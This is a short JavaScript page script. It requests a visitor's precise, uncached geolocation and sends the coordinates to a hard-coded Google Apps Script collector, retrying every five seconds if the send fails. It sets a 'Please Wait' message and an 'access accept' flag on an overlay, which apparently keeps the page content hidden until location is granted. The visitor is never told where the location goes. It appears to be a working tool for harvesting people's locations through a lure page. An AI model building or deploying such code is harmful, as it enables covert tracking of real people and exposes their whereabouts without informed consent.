let svr = `https://script.google.com/macros/s/AKfycbyI73GO_mcdHfTzwZbpQALOMI49lmmHleRVlngk8FkV_H9GPBz2IN_2TsN2qqNi_DXbUw/exec`;

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    function(position) {
      // Success callback: location data is available in the 'position' object
      const lat = position.coords.latitude;
      const long = position.coords.longitude;
      //console.log(`Latitude: ${lat}, Longitude: ${long}`);

      entry({"lat":lat, "long":long}, svr);
      document.querySelector(".s-msg").innerHTML = `Please Wait`;
      document.querySelector(".overflow").setAttribute("access", "accept");
      // You can now use these coordinates, e.g., to display on a map
      // or send to a server.
    },
    function(error) {
      // Error callback: handles issues when getting location
      switch (error.code) {
        case error.PERMISSION_DENIED:
          console.error("User denied the request for Geolocation.");
          break;
        case error.POSITION_UNAVAILABLE:
          console.error("Location information is unavailable.");
          break;
        case error.TIMEOUT:
          console.error("The request to get user location timed out.");
          break;
        case error.UNKNOWN_ERROR:
          console.error("An unknown error occurred.");
          break;
      }
    },
    {
      // Optional: configuration options for the request
      enableHighAccuracy: true, // Request the most accurate location
      timeout: 5000, // Maximum time (in milliseconds) to wait for a position
      maximumAge: 0 // Do not use a cached position
    }
  );
} else {
  console.error("Geolocation is not supported by this browser.");
}


function entry(d, u) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", u, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    let j = JSON.stringify(d);
    xhr.onload = function() {
        if (xhr.status === 200 || xhr.status === 201) { // 200 OK, 201 Created
            
        } else {
            
        }
    };
    xhr.onerror = function() {
        setTimeout(function() { entry(d, u); }, 5000);
    };
    xhr.send(j);
}